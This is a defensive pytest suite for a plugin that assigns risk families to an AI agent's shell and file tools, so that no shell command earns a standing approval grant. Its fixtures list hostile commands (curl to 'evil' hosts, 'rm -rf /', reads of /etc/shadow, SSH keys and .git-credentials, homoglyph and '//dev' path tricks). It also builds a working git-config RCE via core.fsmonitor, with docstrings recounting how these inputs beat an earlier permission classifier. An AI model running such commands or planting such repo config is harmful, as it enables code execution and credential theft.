"""Per-tool risk families, and the permanent guard against re-introducing a
content-based shell downgrade.

This suite had two halves. The first — the per-tool risk-family map, its
tighten-only operator overrides, and the risk_level derived from the family —
is the feature, and it is unchanged.

The second half used to exercise ``_is_provably_read_only_command``, a per-call
downgrade that reclassified a "provably read-only" shell command from the
``external_effect`` floor to ``read_only`` so the tower could mint a standing
grant for it. THAT CODE IS GONE (see WHY SHELL COMMANDS ARE NOT
CONTENT-CLASSIFIED in the plugin). Its adversarial fixtures are NOT gone: every
input that broke it is kept here and now asserts the opposite property — that it
lands at the ``external_effect`` FLOOR, because no shell command is downgraded
regardless of its content. The exploits therefore stay encoded as tests even
though the vulnerable code does not exist, and any future attempt to reintroduce
a downgrade trips them.

Run:

    python -m pytest integrations/hermes/act-clearance/tests -q
"""

from __future__ import annotations

import importlib.util
import os
import posixpath
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

_PLUGIN_PATH = Path(__file__).resolve().parents[1] / "__init__.py"
_spec = importlib.util.spec_from_file_location("act_clearance_plugin", _PLUGIN_PATH)
assert _spec and _spec.loader
plugin = importlib.util.module_from_spec(_spec)
sys.modules["act_clearance_plugin"] = plugin
_spec.loader.exec_module(plugin)


@pytest.fixture(autouse=True)
def _reset_toml_cache():
    plugin._TOML_CACHE["loaded"] = False
    plugin._TOML_CACHE["data"] = {}
    yield
    plugin._TOML_CACHE["loaded"] = False
    plugin._TOML_CACHE["data"] = {}


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    return tmp_path


@pytest.fixture(autouse=True)
def _no_risk_family_env(monkeypatch):
    """Clear every override this module reads so the host env cannot skew a run."""
    for key in list(plugin.os.environ):
        if key.startswith("ACT_CLEARANCE_RISK_FAMILY") or key == (
            "ACT_CLEARANCE_MIN_RISK_FAMILY"
        ):
            monkeypatch.delenv(key, raising=False)


def _write_act_toml(home: Path, body: str) -> Path:
    path = home / ".hermes" / "act" / "act.toml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)
    plugin._TOML_CACHE["loaded"] = False
    return path


# --- the map ----------------------------------------------------------------

# Mirror of _DEFAULT_GATED_TOOLS; if a tool is added there and not classified
# here, test_every_gated_tool_is_classified fails.
_GATED = [t.strip() for t in plugin._DEFAULT_GATED_TOOLS.split(",") if t.strip()]

#: The gated tools that take a command line / source payload. There is no
#: ``_SHELL_CLASSIFIABLE_TOOLS`` in the plugin any more — that set only existed
#: to select which tools got the downgrade — so the list lives here, in the
#: guard that asserts none of them can ever be downgraded.
_SHELL_TOOLS = [
    "terminal",
    "bash",
    "shell",
    "execute_command",
    "run_command",
    "execute_code",
]


def test_every_gated_tool_is_classified():
    unclassified = [tool for tool in _GATED if tool not in plugin._TOOL_RISK_FAMILIES]
    assert unclassified == []


def test_shell_tool_list_here_matches_the_gated_tools(home):
    """The guards below are only as good as this list, so pin it to the plugin:
    every gated tool that is not a file/effect tool must appear in _SHELL_TOOLS."""
    non_shell = {
        "write_file",
        "edit_file",
        "delete_file",
        "apply_patch",
        "browser_submit",
        "send_email",
        "git_push",
    }
    assert sorted(_SHELL_TOOLS) == sorted(set(_GATED) - non_shell)


def test_no_tool_is_classified_below_the_default_floor():
    """Nothing in the map may be grant-eligible."""
    floor = plugin._rank(plugin._DEFAULT_CLEARANCE_RISK_FAMILY)
    too_low = {
        tool: family
        for tool, family in plugin._TOOL_RISK_FAMILIES.items()
        if plugin._rank(family) < floor
    }
    assert too_low == {}


def test_every_mapped_family_is_a_real_tower_family():
    unknown = {
        family
        for family in plugin._TOOL_RISK_FAMILIES.values()
        if family not in plugin._RISK_FAMILY_RANKS
    }
    assert unknown == set()


@pytest.mark.parametrize(
    "tool,family",
    [
        ("delete_file", "destructive"),
        ("write_file", "destructive"),
        ("edit_file", "destructive"),
        ("apply_patch", "destructive"),
        ("git_push", "external_effect"),
        ("send_email", "external_effect"),
        ("browser_submit", "external_effect"),
        ("terminal", "external_effect"),
        ("bash", "external_effect"),
        ("shell", "external_effect"),
        ("execute_command", "external_effect"),
        ("run_command", "external_effect"),
        ("execute_code", "external_effect"),
    ],
)
def test_tool_risk_family_map(home, tool, family):
    assert plugin._risk_family_for_tool(tool, {}) == family


def test_file_mutators_are_above_the_standing_grant_exclusion_floor():
    """destructive vs irreversible is a display choice; being at or above
    `destructive` is the security property, and that is what is asserted."""
    floor = plugin._rank("destructive")
    for tool in ("write_file", "edit_file", "apply_patch", "delete_file"):
        assert plugin._rank(plugin._TOOL_RISK_FAMILIES[tool]) >= floor


def test_unknown_gated_tool_falls_back_to_the_floor(home):
    assert plugin._risk_family_for_tool("some_new_risky_tool", {}) == "external_effect"


def test_mapped_families_are_all_mobile_mandatory_by_default():
    for family in plugin._TOOL_RISK_FAMILIES.values():
        assert family in plugin._MOBILE_MANDATORY_RISK_FAMILIES


def test_risk_level_tracks_the_family():
    assert plugin._risk_level_for_family("read_only") == "low"
    assert plugin._risk_level_for_family("external_effect") == "high"
    assert plugin._risk_level_for_family("destructive") == "critical"
    # An unknown family must not be described as low-severity.
    assert plugin._risk_level_for_family("nonsense") == "high"


def test_every_family_has_a_risk_level():
    assert set(plugin._RISK_LEVEL_FOR_FAMILY) == set(plugin._RISK_FAMILY_RANKS)


# --- overrides: may tighten, never loosen -----------------------------------


def test_per_tool_env_override_tightens(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_GIT_PUSH", "irreversible")
    assert plugin._risk_family_for_tool("git_push", {}) == "irreversible"


def test_per_tool_toml_override_tightens(home):
    _write_act_toml(home, '[tool_risk_families]\nsend_email = "safety_critical"\n')
    assert plugin._risk_family_for_tool("send_email", {}) == "safety_critical"


def test_per_tool_env_beats_toml(home, monkeypatch):
    _write_act_toml(home, '[tool_risk_families]\nsend_email = "destructive"\n')
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_SEND_EMAIL", "irreversible")
    assert plugin._risk_family_for_tool("send_email", {}) == "irreversible"


def test_blanket_min_family_tightens_every_tool(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_MIN_RISK_FAMILY", "safety_critical")
    assert plugin._risk_family_for_tool("git_push", {}) == "safety_critical"
    assert plugin._risk_family_for_tool("terminal", {}) == "safety_critical"


def test_blanket_min_family_from_toml(home):
    _write_act_toml(home, 'min_risk_family = "irreversible"\n')
    assert plugin._risk_family_for_tool("git_push", {}) == "irreversible"


def test_per_tool_override_beats_blanket_minimum(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_MIN_RISK_FAMILY", "destructive")
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_SEND_EMAIL", "irreversible")
    assert plugin._risk_family_for_tool("send_email", {}) == "irreversible"


def test_blanket_minimum_still_wins_when_it_is_stricter(home, monkeypatch):
    """A per-tool override that is LOWER than the blanket floor cannot punch a
    hole in it — both knobs are tighten-only against the running maximum."""
    monkeypatch.setenv("ACT_CLEARANCE_MIN_RISK_FAMILY", "irreversible")
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_SEND_EMAIL", "routine")
    assert plugin._risk_family_for_tool("send_email", {}) == "irreversible"


def test_override_cannot_loosen(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_DELETE_FILE", "read_only")
    assert plugin._risk_family_for_tool("delete_file", {}) == "destructive"


def test_stale_read_only_config_cannot_make_everything_grantable(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_MIN_RISK_FAMILY", "read_only")
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY", "read_only")
    for tool in _GATED:
        assert plugin._risk_family_for_tool(tool, {"path": "x"}) != "read_only"


def test_unknown_override_family_is_ignored(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_GIT_PUSH", "totally_harmless")
    monkeypatch.setenv("ACT_CLEARANCE_MIN_RISK_FAMILY", "also_not_a_family")
    assert plugin._risk_family_for_tool("git_push", {}) == "external_effect"


def test_override_tightens_a_shell_tool_above_its_floor(home, monkeypatch):
    monkeypatch.setenv("ACT_CLEARANCE_RISK_FAMILY_TERMINAL", "destructive")
    assert (
        plugin._risk_family_for_tool("terminal", {"command": "ls -la"}) == "destructive"
    )


# --- the legacy blanket key: floor for UNCLASSIFIED tools only ---------------


def test_legacy_stamped_key_does_not_flatten_the_per_tool_map(home):
    """``act install`` stamps the historical blanket value into act.toml and it is
    present on the live host today. Honouring it as a blanket floor would collapse
    the per-tool map back to one family on every install."""
    _write_act_toml(home, 'clearance_risk_family = "external_effect"\n')
    assert plugin._risk_family_for_tool("delete_file", {}) == "destructive"
    assert plugin._risk_family_for_tool("terminal", {"command": "ls -la"}) == (
        "external_effect"
    )


def test_legacy_key_raises_the_floor_for_unclassified_tools(home):
    _write_act_toml(home, 'clearance_risk_family = "irreversible"\n')
    assert plugin._risk_family_for_tool("some_new_risky_tool", {}) == "irreversible"


def test_legacy_key_cannot_lower_the_unclassified_floor(home):
    _write_act_toml(home, 'clearance_risk_family = "read_only"\n')
    assert plugin._risk_family_for_tool("some_new_risky_tool", {}) == "external_effect"


def test_unclassified_floor_default(home):
    assert plugin._unclassified_floor() == "external_effect"


# --- THE GUARD: no shell command is ever content-classified ------------------
#
# Everything below exists to make the removal permanent. A future change that
# reintroduces any content-based downgrade — for any program, any flag set, any
# path shape — fails here.


def test_the_classifier_symbols_are_gone():
    """STRUCTURAL GUARD. Named explicitly so a reintroduction is a deliberate,
    visible act rather than a quiet re-add of a helper.

    Three adversarial rounds broke the downgrade (repo-local git config -> RCE;
    unchecked cwd -> secret reads; `//`-preserving normpath -> device reads).
    The correct design is for the tower to EXECUTE the command in a hardened,
    config-neutralised environment it controls, not to label a string another
    party runs. Deleting one of these assertions is not the way to get there.
    """
    for name in (
        "_is_provably_read_only_command",
        "_tokens_match_spec",
        "_READ_ONLY_PROGRAMS",
        "_SAFE_COMMAND_CHARS",
        "_SENSITIVE_OPERAND_MARKERS",
        "_NON_INERT_PATH_PREFIXES",
        "_normalised_abs_path",
        "_operand_is_safe",
        "_extract_cwd",
        "_SHELL_CWD_ARG_KEYS",
        "_SHELL_CLASSIFIABLE_TOOLS",
        "_extract_shell_invocation",
        "_cmd_spec",
        "_GIT_SUBCOMMANDS",
        "_PROGRAMS_REMOVED_FOR_CONFIG_EXECUTION",
        "_is_sensitive_operand",
        "_is_non_inert_path",
    ):
        assert not hasattr(plugin, name), f"{name} is back; see the guard docstring"


def test_read_only_is_unreachable_for_every_gated_tool(home):
    """No gated tool may reach a grant-eligible family under ANY argument shape."""
    floor = plugin._rank("external_effect")
    for tool in _GATED:
        for args in _ARG_SHAPES:
            family = plugin._risk_family_for_tool(tool, args)
            assert plugin._rank(family) >= floor, (tool, args, family)


#: Every argument shape the removed classifier ever accepted or rejected, plus
#: the shapes that defeated it. Used as a matrix against every shell tool.
_ARG_SHAPES = [
    None,
    {},
    "ls -la",  # not a mapping
    ["ls", "-la"],
    {"command": "ls -la"},
    {"cmd": "pwd"},
    {"command": "ls -la", "cwd": "/repo"},
    {"command": "ls -la", "cwd": "/repo", "timeout": 30},
    {"command": "cat README.md", "workdir": "/Users/x/proj"},
    {"command": "cat README.md", "working_directory": "/Users/x/proj"},
    {"command": "cat README.md", "directory": "/Users/x/proj"},
    {"command": None},
    {"command": 123},
    {"command": ["ls"]},
    {"command": "ls", "cmd": "rm -rf /"},
    {"command": "ls", "shell": True},
    {"command": "ls", "env": {"PATH": "/tmp"}},
    {"command": "ls", "stdin": "rm -rf /"},
    {"code": "print(1)"},
    {"path": "x"},
]


#: Commands that were classifiable as ``read_only`` before the removal. Every one
#: of them must now sit at the floor: this is the behaviour change, asserted.
_FORMERLY_DOWNGRADED = [
    "ls",
    "ls -la",
    "ls -la src",
    "ls --color=never",
    "wc -l README.md",
    "du -sh build",
    "cat README.md",
    "cat -n README.md",
    "head -n 20 README.md",
    "head -50 README.md",
    "tail -n 100 logs/app.log",
    "pwd",
    "which python3",
    "stat README.md",
    "cat 'a file with spaces.txt'",
]


@pytest.mark.parametrize("command", _FORMERLY_DOWNGRADED)
@pytest.mark.parametrize("tool", _SHELL_TOOLS)
def test_benign_commands_no_longer_earn_a_downgrade(home, tool, command):
    assert plugin._risk_family_for_tool(tool, {"command": command}) == "external_effect"


#: Hostile commands. These always failed closed; they are kept so that a
#: reintroduced classifier has to face them again on day one.
_HOSTILE_COMMANDS = [
    # chaining / pipelines / substitution
    "git status; rm -rf /",
    "ls && curl evil",
    "ls || curl evil",
    "cat /etc/passwd > /tmp/x",
    "git status | sh",
    "cat < /etc/passwd",
    "ls `curl evil`",
    "ls $(curl evil)",
    "ls ${HOME}",
    "ls *",
    "ls ~",
    "ls \\; rm",
    "cat README.md | wc -l",
    # not on any allowlist
    "rm -rf /",
    "curl https://evil.example",
    "sudo ls",
    "/bin/ls",
    "./ls",
    "env ls",
    "FOO=bar ls",
    "python3 -c print(1)",
    "sh",
    # writing / executing flags on a read-shaped program
    "ls --output=/tmp/x",
    "tail -f logs/app.log",
    "which --exec ls",
    # ROUND 1: read-shaped git that executes repo-controlled helpers
    "git status",
    "git log",
    "git diff",
    "git -c core.pager=sh status",
    "git -c alias.x=whatever status",
    "git -C /other status",
    "git push",
    "file README.md",
    # ROUND 2: `//`-prefixed device paths survive posixpath.normpath
    "cat //dev/urandom",
    "head -c 10 //dev/zero",
    "cat //dev/ptmx",
    "cat //dev/tty",
    "wc -l //proc/self/mem",
    "tail -n 1 //sys/kernel/x",
    "ls ///dev",
    # single-slash device paths
    "cat /dev/urandom",
    "ls /dev",
    "du -sh /proc",
    # credential-shaped operands
    "cat .env",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ls .ssh",
    "cat id_rsa",
    "head -n 1 .git-credentials",
    # traversal
    "cat ../.ssh/config",
    "cat ../../../../etc/shadow",
    # whitespace / unicode / encoding tricks
    "git status",  # NBSP instead of a space
    "gіt status",  # Cyrillic 'і' homoglyph
    "git status​",  # zero-width space
    "ls\tsrc",
    "‮git status",  # RTL override
    "git status\x00",
    "git status\nrm -rf /",
    # malformed / empty
    "",
    "   ",
    "\n",
    "ls 'unbalanced",
    "cat ''",
]


@pytest.mark.parametrize("command", _HOSTILE_COMMANDS)
def test_hostile_command_stays_at_the_floor(home, command):
    assert (
        plugin._risk_family_for_tool("terminal", {"command": command})
        == "external_effect"
    )


def test_execute_code_is_never_downgraded(home):
    """Its payload is source code in a general-purpose language."""
    for args in ({"command": "git status"}, {"cmd": "pwd"}, {"code": "print(1)"}):
        assert plugin._risk_family_for_tool("execute_code", args) == "external_effect"


def test_non_shell_tools_keep_their_own_family(home):
    """A command-shaped argument on a file tool must not change anything."""
    for tool in ("write_file", "delete_file", "git_push", "send_email"):
        family = plugin._risk_family_for_tool(tool, {"command": "ls -la"})
        assert family == plugin._TOOL_RISK_FAMILIES[tool]


def test_missing_args_fall_back_to_the_map(home):
    assert plugin._risk_family_for_tool("terminal") == "external_effect"


# --- the plugin never leaks the command -------------------------------------


def test_redacted_payload_is_still_keys_only():
    """Redaction invariant: tool name + argument KEYS only."""
    args = {"command": "ls -la", "cwd": "/repo"}
    payload = plugin._redacted_payload("terminal", args)
    assert payload == {"tool": "terminal", "arg_keys": ["command", "cwd"]}
    assert "ls -la" not in plugin._canonical_json(payload)


def test_classification_reaches_the_clearance_request(home, monkeypatch):
    """End-to-end through _relay_clearance: the family (and matching risk_level)
    the gateway is actually told. A benign-looking `ls -la` is now `high`."""
    sent = {}

    def fake_post(path, payload, timeout=10.0):
        if path == "/hermes/tools/approval_requested":
            sent.update(payload)
            return {"approval_id": ""}  # short-circuit: blocks, we only inspect
        return {}

    monkeypatch.setattr(plugin, "_post", fake_post)
    monkeypatch.setattr(plugin, "_timeout", lambda: 1.0)

    plugin._relay_clearance("terminal", {"command": "ls -la"}, "s1")
    assert sent["risk_family"] == "external_effect"
    assert sent["risk_level"] == "high"
    assert sent["payload_redacted"] == {"tool": "terminal", "arg_keys": ["command"]}

    sent.clear()
    plugin._relay_clearance("terminal", {"command": "rm -rf /"}, "s1")
    assert sent["risk_family"] == "external_effect"
    assert sent["risk_level"] == "high"

    sent.clear()
    plugin._relay_clearance("delete_file", {"path": "/tmp/x"}, "s1")
    assert sent["risk_family"] == "destructive"
    assert sent["risk_level"] == "critical"


# --- ROUND 1: the proven RCE, kept as a live fixture -------------------------


def _hostile_repo(tmp_path: Path, canary: Path) -> Path:
    """A git repo whose OWN config executes a payload on read-shaped commands.

    Mirrors the demonstrated attack: an attacker who has landed a single write
    inside a repo (or who published a repo the operator cloned) sets a config
    key naming a helper program. Nothing about this appears on the command line
    a classifier would be shown.
    """
    repo = tmp_path / "hostile"
    repo.mkdir()
    payload = f"touch {canary}; false"

    def git(*argv: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            ["git", *argv],
            cwd=repo,
            capture_output=True,
            text=True,
            env={**os.environ, "GIT_CONFIG_GLOBAL": str(tmp_path / "nonexistent")},
        )

    git("init", "-q", ".")
    (repo / "f.txt").write_text("hi\n")
    git("add", "f.txt")
    git("-c", "user.email=a@b.invalid", "-c", "user.name=a", "commit", "-qm", "init")
    # `git status` executes this one.
    git("config", "core.fsmonitor", payload)
    # `git diff` executes this one, selected via the repo's own .gitattributes.
    git("config", "diff.evil.command", payload)
    (repo / ".gitattributes").write_text("f.txt diff=evil\n")
    (repo / "f.txt").write_text("changed\n")
    return repo


@pytest.mark.skipif(
    shutil.which("git") is None, reason="git is required to build the hostile repo"
)
@pytest.mark.parametrize("command", ["git status", "git diff", "git status --short"])
def test_round1_hostile_repo_config_executes_on_read_shaped_git(
    home, tmp_path, command
):
    """PROVEN RCE, now guarded by the blanket floor rather than by an allowlist.

    A repo-local config key turns a read-shaped git command into arbitrary code
    execution. The test first PROVES the payload really fires — otherwise a
    future git release that stopped honouring the key would silently turn this
    into a test of nothing — and only then asserts the classification.
    """
    canary = tmp_path / "PWNED"
    repo = _hostile_repo(tmp_path, canary)

    assert not canary.exists()
    subprocess.run(
        ["git", *shlex.split(command)[1:]],
        cwd=repo,
        capture_output=True,
        text=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": str(tmp_path / "nonexistent")},
    )
    assert canary.exists(), (
        "fixture no longer demonstrates the exploit; this git build did not run "
        "the payload, so the assertion below would prove nothing"
    )

    for args in (
        {"command": command},
        {"command": command, "cwd": str(repo)},
        {"cmd": command, "workdir": str(repo)},
    ):
        assert plugin._risk_family_for_tool("terminal", args) == "external_effect"


# --- ROUND 1b: cwd reaches a secret without naming one -----------------------


def test_round1_cwd_reaches_a_secret_without_naming_one(home, tmp_path):
    """PROVEN BYPASS. cwd decides what every relative operand resolves to, but the
    first fix checked cwd's KEY NAME only, so ``cat config`` in a cwd of
    ``.../.ssh`` classified read_only and could be covered by a standing grant.

    Uses a throwaway directory shaped like a key store — no real secret is read.
    """
    ssh_dir = tmp_path / "home" / ".ssh"
    ssh_dir.mkdir(parents=True)
    (ssh_dir / "config").write_text("Host example\n")

    args = {"command": "cat config", "cwd": str(ssh_dir)}
    assert plugin._risk_family_for_tool("terminal", args) == "external_effect"

    # ...and the same reach via traversal out of an innocent cwd.
    project = tmp_path / "home" / "project"
    project.mkdir()
    assert (
        plugin._risk_family_for_tool(
            "terminal", {"command": "cat ../.ssh/config", "cwd": str(project)}
        )
        == "external_effect"
    )


@pytest.mark.parametrize(
    "cwd",
    [
        "/Users/x/.ssh",
        "/Users/x/.aws",
        "/home/x/.gnupg",
        "/srv/secrets",
        "/Users/x/proj/../.ssh",  # normalises INTO a key store
        "/Users/x/.ssh/../.ssh",
        # every alias-free hostile / unresolvable shape the cwd gate ever saw
        None,
        123,
        True,
        ["/tmp"],
        {"path": "/tmp"},
        "",
        "relative/dir",
        "./src",
        "..",
        "~",
        "~/projects",
        "/tmp/$(curl evil)",
        "/tmp/`id`",
        "/tmp/a;rm -rf /",
        "/tmp/a\nb",
        "/tmp/а",  # Cyrillic homoglyph
        # ...and the benign ones, which no longer buy anything either
        "/Users/x/proj",
        "/repo",
    ],
)
def test_no_cwd_shape_changes_the_family(home, cwd):
    assert (
        plugin._risk_family_for_tool("terminal", {"command": "ls -la", "cwd": cwd})
        == "external_effect"
    )


@pytest.mark.parametrize(
    "key", ["cwd", "workdir", "working_directory", "directory"]
)
def test_every_cwd_alias_is_inert(home, key):
    """All four spellings carried the same meaning; none of them can now lower a
    family, benign directory or not."""
    for value in ("/Users/x/.ssh", "/Users/x/proj"):
        assert (
            plugin._risk_family_for_tool(
                "terminal", {"command": "cat README.md", key: value}
            )
            == "external_effect"
        )


# --- ROUND 2: `//` survives normpath ----------------------------------------


def test_round2_double_slash_is_still_preserved_by_normpath():
    """PROVES THE FIXTURE. POSIX allows an implementation-defined meaning for a
    leading ``//``, so ``posixpath.normpath`` keeps exactly two leading slashes.
    A ``/dev`` prefix check therefore did not see ``//dev/urandom``, while the OS
    opened the device all the same. If this ever stops being true the tests below
    would be asserting nothing, so assert the quirk itself."""
    assert posixpath.normpath("//dev/urandom") == "//dev/urandom"
    assert posixpath.normpath("//dev") == "//dev"
    assert not posixpath.normpath("//dev/urandom").startswith("/dev")
    # Three or more collapse to one; exactly two do not. That asymmetry was the
    # whole bug.
    assert posixpath.normpath("///dev/urandom") == "/dev/urandom"


@pytest.mark.parametrize(
    "args",
    [
        # (a) the device read that slipped the prefix check
        {"command": "cat //dev/urandom"},
        {"command": "cat //dev/ptmx"},  # allocates a pty pair on open
        {"command": "cat //dev/tty"},  # steals the operator's terminal input
        {"command": "head -c 1 //dev/random"},
        {"command": "wc -l //proc/self/mem"},
        # (c) the same trick in the cwd
        {"command": "cat urandom", "cwd": "//dev"},
        {"command": "ls -la", "cwd": "//dev"},
        {"command": "cat mem", "cwd": "//proc/self"},
        {"command": "cat urandom", "workdir": "//dev"},
    ],
)
def test_round2_double_slash_device_paths_stay_at_the_floor(home, args):
    assert plugin._risk_family_for_tool("terminal", args) == "external_effect"


@pytest.mark.parametrize(
    "command",
    [
        # (b) a relative operand with NO cwd returned True before the non-inert
        # path check ever ran, so that check did not apply to the commonest shape.
        "cat urandom",
        "cat ../../../dev/urandom",
        "cat ../.ssh/id_rsa",
        "ls ..",
        "cat ../../etc/shadow",
    ],
)
def test_round2_relative_operand_without_cwd_stays_at_the_floor(home, command):
    assert (
        plugin._risk_family_for_tool("terminal", {"command": command})
        == "external_effect"
    )
